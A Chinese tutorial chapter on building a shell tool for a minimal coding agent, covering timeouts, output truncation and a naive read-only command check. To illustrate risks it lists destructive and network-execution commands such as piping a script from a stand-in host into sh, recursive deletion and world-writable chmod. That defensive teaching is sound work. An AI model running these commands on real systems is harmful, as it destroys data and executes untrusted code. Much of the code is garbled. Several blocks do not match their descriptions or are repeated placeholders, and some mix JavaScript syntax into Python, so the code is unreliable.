# 第 2 卷：最小 Agent 实现

## 第 8 章：Shell 工具，最强大也最危险的能力

### 8.1 本章目标

前两章我们实现了文件读取和搜索。Agent 现在能观察项目，但还不能验证项目。一个 coding Agent 如果不能运行测试、查看 git 状态、执行构建命令，它就很难真正完成“修复问题”。

Shell 工具就是为了解决这个问题。

它能做很多有用的事：

```bash
pytest
ruff check .
git status
git diff
ls -la
cat pyproject.toml
rg "TODO"
```

但它也能做非常危险的事：

```bash
rm -rf .
curl bad.example/script.sh | sh
git push --force
python -m build && twine upload dist/*
chmod -R 777 /
```

所以 Shell 工具是 Agent 工程里的分水岭。做得好，它让 Agent 拥有真实工作能力；做得差，它会让 Agent 变成高风险自动执行器。

本章目标：

1. 理解 Shell 工具为什么必要。
2. 理解 Shell 工具的风险类别。
3. 设计最小 `shell` 工具输入输出。
4. 实现命令执行、超时、输出截断。
5. 初步区分只读命令和写入命令。
6. 为下一章权限系统做准备。
7. 对照 Claude Code 的 `BashTool` 理解生产级复杂度。

### 8.2 为什么需要 Shell 工具

搜索和读取只能回答“代码现在是什么样”。Shell 可以回答“代码运行起来怎么样”。

举例：

用户说：

```text
修复测试失败。
```

一个没有 shell 的 Agent 只能读代码、猜测修改。它不能知道当前测试失败在哪里，也不能确认修复后是否通过。

有 shell 后，Agent 可以：

```text
运行测试 -> 读取错误 -> 定位文件 -> 修改代码 -> 再运行测试
```

这就是 coding Agent 的基本闭环。

再比如用户说：

```text
看看这个项目怎么启动。
```

Agent 可以：

```text
read_file pyproject.toml
shell python -m pytest
read_file README.md
```

Shell 工具让 Agent 能利用项目已有工具链，而不是把所有能力都重写成专用工具。

### 8.3 Shell 工具为什么危险

Shell 的危险来自它的开放性。`read_file` 只能读文件，`grep_files` 只能搜索文本，但 shell 几乎可以做任何事。

风险一：删除或覆盖文件。

```bash
rm -rf src
echo "" > pyproject.toml
git checkout -- .
```

风险二：修改系统或权限。

```bash
chmod -R 777 .
sudo rm ...
```

风险三：网络执行。

```bash
curl https://example.com/install.sh | sh
wget ... && bash ...
```

风险四：发布或推送。

```bash
python -m build && twine upload dist/*
git push --force
```

风险五：无限运行。

```bash
while true; do echo hi; done
python -m mini_agent
tail -f log.txt
```

风险六：巨大输出。

```bash
cat huge.log
find /
yes
```

风险七：命令注入和 shell 解析复杂性。

比如：

```bash
echo safe && rm -rf src
cat file | xargs rm
VAR=1 git push
```

你不能只看命令开头是不是 `echo` 或 `cat`。Shell 是一种语言，有管道、重定向、变量、子命令、条件执行、别名、函数、通配符。生产级工具必须非常谨慎。

Claude Code 的 `BashTool` 之所以很复杂，就是因为它要处理这些风险。

### 8.4 先做最小安全版

本书不会一上来实现完整 Bash 安全解析。我们先做一个最小安全版：

1. 命令必须在 cwd 中运行。
2. 命令有超时。
3. stdout/stderr 有最大长度。
4. 默认只自动允许明显只读命令。
5. 非只读命令先返回“需要权限”，后续章节再实现交互确认。

这不是生产级安全，但比裸跑 shell 好很多。

本章的目标不是“让 Shell 工具完美安全”，而是建立结构：

```text
输入 schema
  ↓
命令分类
  ↓
权限决策
  ↓
执行命令
  ↓
超时/取消
  ↓
截断输出
  ↓
tool_result
```

后面我们会逐步增强权限和沙箱。

### 8.5 Shell 工具输入设计

先设计输入：

```python
inputSchema =:
    "command": str
    "timeoutMs": int.positive() | None
```

字段含义：

`command` 是要执行的 shell 命令。

`timeoutMs` 是超时时间，最大限制 120 秒。

为什么要限制最大 timeout？因为模型可能请求：

```json
{ "timeoutMs": 999999999 }
```

这会让命令长时间占用进程。schema 不只是类型校验，也是安全边界。

后面可以加入：

```python
"description": str | None
"runInBackground": bool | None
```

Claude Code 的 BashTool 输入就更丰富，支持描述、超时、后台运行等。我们先保持最小。

### 8.6 Shell 工具输出设计

输出需要包含：

```python
import asyncio
from dataclasses import dataclass

@dataclass
class CommandResult:
    command: str
    exit_code: int | None
    stdout: str
    stderr: str
    timed_out: bool = False

async def run_command(command: str, timeout: float = 30.0) -> CommandResult:
    process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    try:
        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout)
        return CommandResult(command, process.returncode, stdout.decode(), stderr.decode())
    except asyncio.TimeoutError:
        process.kill()
        return CommandResult(command, None, "", "命令超时", True)
```

字段含义：

`command`：实际运行的命令。

`exitCode`：退出码。超时或信号终止时可能没有正常退出码。

`stdout`：标准输出。

`stderr`：错误输出。

`timedOut`：是否超时。

`truncated`：输出是否被截断。

为什么要把 `exitCode` 给模型？因为命令失败不一定是工具失败。比如 `pytest` 退出码 1，说明测试失败，这正是模型需要分析的信息。它应该作为普通工具结果返回，而不是 `is_error: true`。

工具执行本身失败，例如 shell 启动失败、cwd 不存在、权限系统拒绝，才更适合作为工具错误。

这是一个重要区别：

```text
命令退出码非零 -> 任务观察结果
工具无法执行命令 -> 工具错误
```

Claude Code 的 BashTool 也会解释命令结果，并把 stdout/stderr、exit code、是否 interrupted 等信息映射给模型。

### 8.7 只读命令的第一版判断

我们先定义一组明显只读命令：

```python
READ_ONLY_COMMANDS =:
    "ls"
    "pwd"
    "cat"
    "head"
    "tail"
    "grep"
    "rg"
    "find"
    "wc"
    "git"
```

但 `git` 很特殊：

```bash
git status
git diff
git log
```

是只读。

```bash
git commit
git push
git reset --hard
```

不是只读。

所以最小版可以写：

```python
from pathlib import Path

def resolve_inside_workspace(workspace: Path, user_path: str) -> Path:
    root = workspace.resolve()
    target = (root / user_path).resolve()
    if root != target and root not in target.parents:
        raise ValueError(f"Path is outside current workspace: {user_path}")
    return target

def read_text_file(workspace: Path, user_path: str) -> str:
    return resolve_inside_workspace(workspace, user_path).read_text(encoding="utf-8")
```

这个函数很不完美。

例如：

```bash
cat README.md > copy.md
```

开头是 `cat`，但它写文件。

```bash
ls && rm -rf src
```

开头是 `ls`，但后半段删除。

所以我们必须明确告诉读者：这是教学版，不是生产级安全判断。下一章权限系统会进一步改进；后面讲 Bash 安全时还会专门讨论 shell 解析。

Claude Code 不会只靠这种简单判断。它有 `bashPermissions.py`、`readOnlyValidation.py`、`commandSemantics.py`、`bashSecurity.py` 等模块，并且会解析命令结构。

### 8.8 本章接下来要做什么

接下来几节会实现：

1. `shell` 工具的 Zod schema。
2. `execCommand()`：基于 Python `child_process` 执行命令。
3. 超时控制。
4. stdout/stderr 收集和截断。
5. `shellTool` 的 `call()`。
6. 非只读命令的临时拒绝策略。
7. 和 AgentEngine 的集成。

本章写完后，mini-agent 将能完成：

```text
用户：运行测试
  ↓
模型：shell("pytest")
  ↓
工具：执行命令并返回 stdout/stderr/exitCode
  ↓
模型：解释测试结果
```

这会让我们的 Agent 第一次具备“验证”能力。

### 8.9 为什么选择 spawn 而不是 exec

Python 里执行命令常见有两个选择：

```python
import subprocess

pass
```

`exec` 用起来很简单：

```python
from typing import Any

def example(context: dict[str, Any]) -> dict[str, Any]:
    return {"ok": True, "context": context}
```

但它有一个特点：会把 stdout/stderr 缓存在内存里，等命令结束后一次性回调。对小命令没问题，对 Agent Shell 工具不够理想。

为什么？

第一，命令可能输出很多内容。

比如：

```bash
pytest
find .
cat large.log
```

如果全部缓存，可能占用大量内存。

第二，我们希望未来支持实时进度。

比如命令运行时不断输出测试进度，TUI 应该能显示。`spawn` 可以监听 data event，边输出边处理。

第三，我们需要更精细地截断输出。

当 stdout 超过上限时，我们可以停止继续积累，而不是等全部结束。

所以教学项目也采用 `spawn`。先不做实时 UI，但保留结构。

### 8.10 输出截断器

先写一个小工具，限制字符串最大长度。

创建 `src/mini_agent/utils/OutputAccumulator.py`：

```python
from typing import Any

def example(context: dict[str, Any]) -> dict[str, Any]:
    return {"ok": True, "context": context}
```

这个类非常简单，但意义很大。工具输出必须有预算。无论是 shell、grep、web fetch，还是 MCP 工具，都可能返回巨大内容。如果你不限制，模型上下文、内存和成本都会失控。

Claude Code 中有更成熟的机制，比如：

- BashTool 有输出截断和大输出持久化。
- `toolResultStorage` 会把过大的工具结果保存到磁盘，只给模型预览。
- `applyToolResultBudget` 会在查询前进一步限制历史工具结果总量。

我们的 mini-agent 先把 stdout/stderr 截断到固定长度。

### 8.11 execCommand 第一版

创建 `src/mini_agent/tools/shell/execCommand.py`：

```python
import asyncio
from dataclasses import dataclass

@dataclass
class CommandResult:
    command: str
    exit_code: int | None
    stdout: str
    stderr: str
    timed_out: bool = False

async def run_command(command: str, cwd: str, timeout: float = 30.0) -> CommandResult:
    process = await asyncio.create_subprocess_shell(
        command,
        cwd=cwd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout)
        return CommandResult(command, process.returncode, stdout.decode(), stderr.decode())
    except asyncio.TimeoutError:
        process.kill()
        return CommandResult(command, None, "", "命令超时", True)
```

这段代码做了几件事：

1. 在指定 cwd 中运行命令。
2. 使用 shell 执行命令。
3. 忽略 stdin，避免命令等待输入。
4. 收集 stdout/stderr。
5. 超时后发送 SIGTERM。
6. 截断输出。
7. 返回 exitCode、timedOut、truncated。

这里有一个重要选择：

```python
"shell": True
```

这让用户可以运行：

```bash
pytest && ruff check .
rg "foo" | head
```

但也意味着 shell 语法会生效，风险更高。生产系统要非常谨慎。Claude Code 的 BashTool 需要解析命令、分类命令、判断权限，就是因为 shell 是完整语言。

教学项目先保留 `shell: true`，但后面权限系统会默认拒绝非只读命令。

### 8.12 shell 工具 schema

创建 `src/mini_agent/tools/shelltool.py`：

```python
import asyncio
from dataclasses import dataclass

@dataclass
class CommandResult:
    command: str
    exit_code: int | None
    stdout: str
    stderr: str
    timed_out: bool = False

async def run_command(command: str, cwd: str, timeout: float = 30.0) -> CommandResult:
    process = await asyncio.create_subprocess_shell(
        command,
        cwd=cwd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout)
        return CommandResult(command, process.returncode, stdout.decode(), stderr.decode())
    except asyncio.TimeoutError:
        process.kill()
        return CommandResult(command, None, "", "命令超时", True)
```

这里 `command` 使用 `.min(1)`，避免空命令。

`timeoutMs` 最大 120 秒。默认值可以放在 call 里：

```python
DEFAULT_TIMEOUT_MS = 30_000
```

### 8.13 第一版只读判断

在同一个文件中加入：

```python
READ_ONLY_COMMANDS =:
    "ls"
    "pwd"
    "cat"
    "head"
    "tail"
    "grep"
    "rg"
    "find"
    "wc"
    "stat"
    "file"

READ_ONLY_GIT_SUBCOMMANDS =:
    "status"
    "diff"
    "log"
    "show"
    "branch"

def firstWords(command: str):
    return command.strip().split(/\s+/)

def isObviouslyReadOnly(command: str):
    [base, subcommand] = firstWords(command)

    if (not base) return False

    if base === "git":
        return READ_ONLY_GIT_SUBCOMMANDS.has(subcommand  or  "")

    return READ_ONLY_COMMANDS.has(base)
```

再强调一次：这只是教学版。它不能识别重定向、管道、`&&`、`;` 等危险组合。

为了让教学版更保守，我们可以加一个粗略拒绝：

```python
def containsShellOperator(command: str):
    return /[;&|<>"$]/.test(command)
```

然后：

```python
def isObviouslyReadOnly(command: str):
    if (containsShellOperator(command)) return False

    [base, subcommand] = firstWords(command)
    // ...
```

这会拒绝很多本来安全的命令，例如：

```bash
rg foo | head
```

但教学版宁可保守。后面学完权限和 Bash 解析，再逐步放宽。

### 8.14 临时权限策略

我们还没有实现交互式权限确认，所以本章先做一个临时策略：

```text
只读命令：允许执行
非只读命令：返回错误 tool_result，提示需要权限系统
```

也就是说，如果模型调用：

```bash
pytest
```

严格说 `pytest` 不一定只读，因为测试脚本可以写文件、启动服务、访问网络。但它是 coding Agent 很常用的验证命令。

教学版可以有两个选择。

选择一：保守，拒绝 `pytest`，等权限系统完成后再允许。

选择二：把 `pytest` 当成需要用户明确允许的命令，但目前没有 UI，所以先拒绝。

本章选择保守策略。下一章权限系统实现后，用户可以确认执行。

### 8.15 实现 shellTool

完整工具：

```python
from dataclasses import dataclass
from typing import Literal

Decision = Literal["allow", "deny", "ask"]

@dataclass
class PermissionRule:
    source: str
    behavior: Decision
    tool_name: str
    rule_content: str = ""

def format_rule(rule: PermissionRule) -> str:
    content = f"({rule.rule_content})" if rule.rule_content else ""
    return f"{rule.source}:{rule.behavior}:{rule.tool_name}{content}"

def deny_message(rule: PermissionRule) -> dict[str, str]:
    return {
        "behavior": "deny",
        "message": f"Denied by {format_rule(rule)}",
        "reason": "Matched deny rule",
    }
```

注意这里的策略：

```python
import asyncio
from dataclasses import dataclass

@dataclass
class CommandResult:
    command: str
    exit_code: int | None
    stdout: str
    stderr: str
    timed_out: bool = False

async def run_command(command: str, timeout: float = 30.0) -> CommandResult:
    process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    try:
        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout)
        return CommandResult(command, process.returncode, stdout.decode(), stderr.decode())
    except asyncio.TimeoutError:
        process.kill()
        return CommandResult(command, None, "", "命令超时", True)
```

因为 `runToolUse()` 会捕获工具错误并返回错误 tool_result，所以模型会看到：

```text
Error: Command requires permission and cannot run yet: pytest
```

下一章加入权限系统后，这里不应该直接 throw，而应该交给 `checkPermission()`。

### 8.16 注册 shell 工具

更新工具注册：

```python

def createToolRegistry():
    registry = ToolRegistry()
    registry.register(readFileTool)
    registry.register(globFilesTool)
    registry.register(grepFilesTool)
    registry.register(shellTool)
    return registry
```

现在工具池是：

```text
read_file
glob_files
grep_files
shell
```

这已经很接近最小 coding Agent：

- 搜索文件。
- 读取文件。
- 查看状态。
- 运行只读命令。

真正写文件和运行测试还要等权限系统。

### 8.17 更新 FakeModel：模拟 shell 调用

让 FakeModel 支持：

```text
列文件
查看 git 状态
运行测试
```

示例：

```python
import asyncio
from dataclasses import dataclass

@dataclass
class CommandResult:
    command: str
    exit_code: int | None
    stdout: str
    stderr: str
    timed_out: bool = False

async def run_command(command: str, timeout: float = 30.0) -> CommandResult:
    process = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
    try:
        stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=timeout)
        return CommandResult(command, process.returncode, stdout.decode(), stderr.decode())
    except asyncio.TimeoutError:
        process.kill()
        return CommandResult(command, None, "", "命令超时", True)
```

运行结果应该是：

- `ls` 可以执行。
- `git status` 可以执行。
- `pytest` 会被拒绝，返回错误 tool_result。

这正好给下一章权限系统埋下伏笔。

### 8.18 命令退出码不是工具错误

这一点非常重要，再单独强调。

假设命令是：

```bash
grep "not-exist-pattern" README.md
```

`grep` 没找到时可能返回 exit code 1。这不是工具执行失败，而是命令结果。

再比如：

```bash
pytest
```

测试失败返回 exit code 1。这正是 Agent 需要观察的信息。

所以 `execCommand()` 不应该因为 exit code 非零就 reject。它应该正常 resolve：

```python
resolve(:
    "exitCode": code
    stdout
    stderr
```

只有这些情况才 reject：

- 无法启动进程。
- cwd 不存在。
- Python spawn 自身报错。

Claude Code 的 BashTool 也会把命令语义和工具错误区分开。它还会用 `interpretCommandResult` 判断某些命令的非零退出码是否应被解释为错误、成功或特殊状态。

### 8.19 输出截断的模型提示

如果输出被截断，模型应该知道。

我们的 `formatResult()` 里有：

```text
Output truncated: true
```

还可以更明确一点：

```python
def if(self, output.truncated):
    parts.append(
    "Note: output was truncated. Run a more specific command if you need more detail."
    )
```

这类提示会影响模型行为。

如果模型看到：

```text
Output truncated: true
```

它可能继续运行：

```bash
pytest -- parser.test.py
```

或者：

```bash
grep -n "specific error" log.txt
```

这就是 Agent 工具结果设计的技巧：不仅要返回数据，还要帮助模型知道下一步怎么缩小范围。

### 8.20 和 Claude Code BashTool 对照

Claude Code 的 BashTool 比我们的版本复杂很多。它处理：

1. 命令 schema。
2. 默认超时和最大超时。
3. 后台运行。
4. shell 输出流式进度。
5. cwd 变化检测和限制。
6. 只读命令判断。
7. sed in-place edit 的特殊处理。
8. 沙箱判断。
9. 权限规则匹配。
10. Bash classifier。
11. git 操作追踪。
12. 输出截断。
13. 大输出持久化。
14. 图片输出。
15. 前台/后台任务管理。
16. 中断和取消。
17. UI 渲染。

为什么这么多？因为 shell 是 Agent 能力中最接近“任意代码执行”的部分。每一个小细节都可能影响安全和体验。

例如，Claude Code 会把搜索/读取命令识别出来，作为 collapsible display 的依据。它还会区分 `isReadOnly` 和 `isConcurrencySafe`。只读搜索可以并发，写入命令必须串行。

我们的 Shell 工具目前只是学习版。但它已经有几个正确方向：

- schema 校验。
- cwd 限制。
- 超时。
- 输出截断。
- 非只读默认拒绝。
- exit code 作为观察结果。

### 8.21 常见坑

坑一：用 `exec` 不限制输出。

大输出会占内存，也会撑爆上下文。

坑二：非零 exit code 直接 throw。

测试失败、grep 无匹配、lint 报错都可能是有用观察，不应该自动变成工具异常。

坑三：没有超时。

`python -m mini_agent`、`tail -f`、死循环都会卡住 Agent。

坑四：用命令开头判断安全。

`cat file > other` 和 `ls && rm -rf src` 都能绕过简单判断。

坑五：没有权限系统就运行写命令。

Shell 工具应该默认保守。先拒绝，再逐步引入用户确认。

### 8.22 本章练习

练习一：实现 `OutputAccumulator`。

要求：

- 支持最大字符数。
- 超过后截断。
- 暴露 `truncated`。

练习二：实现 `execCommand()`。

要求：

- 使用 `spawn`。
- 支持 cwd。
- 支持 timeout。
- 收集 stdout/stderr。
- exit code 非零也 resolve。

练习三：实现 `shellTool`。

要求：

- schema 包含 `command` 和 `timeoutMs`。
- 只允许明显只读命令。
- 输出包含 command、exitCode、stdout、stderr、timedOut、truncated。

练习四：测试命令。

测试：

```bash
ls
git status
pytest
```

确认：

- `ls` 可运行。
- `git status` 可运行。
- `pytest` 暂时被拒绝。

练习五：思考安全问题。

下面命令为什么危险？

```bash
cat README.md > copy.md
ls && rm -rf src
curl https://example.com/install.sh | sh
```

### 8.23 本章小结

本章我们实现了 Shell 工具的最小安全版。它还不能运行所有命令，但已经建立了正确的工程结构：

1. 命令参数必须 schema 校验。
2. 命令必须在 cwd 内执行。
3. 命令必须有超时。
4. 输出必须截断。
5. 退出码是观察结果，不等于工具错误。
6. 非只读命令先拒绝，等待权限系统。

下一章我们就来实现权限系统，让 Agent 在遇到写入、测试、构建等命令时，可以询问用户，而不是只能拒绝。

---
